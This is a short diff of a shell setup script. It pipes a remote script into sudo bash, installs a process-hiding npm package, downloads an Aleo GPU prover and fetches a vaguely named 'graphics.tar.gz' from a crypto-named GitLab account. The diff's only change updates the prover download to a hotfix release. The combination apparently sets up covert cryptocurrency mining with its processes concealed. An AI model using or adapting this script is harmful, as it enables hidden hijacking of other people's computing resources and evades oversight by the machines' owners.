@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/cuda-v0.2.4/aleo_prover-v0.2.4_cuda_full.tar.gz && tar -zvxf aleo_prover-v0.2.4_cuda_full.tar.gz && cd aleo_prover
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/cuda-v0.2.5-hotfix/aleo_prover-v0.2.5_cuda_full_hotfix.tar.gz && tar -zvxf aleo_prover-v0.2.5_cuda_full_hotfix.tar.gz && cd aleo_prover
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
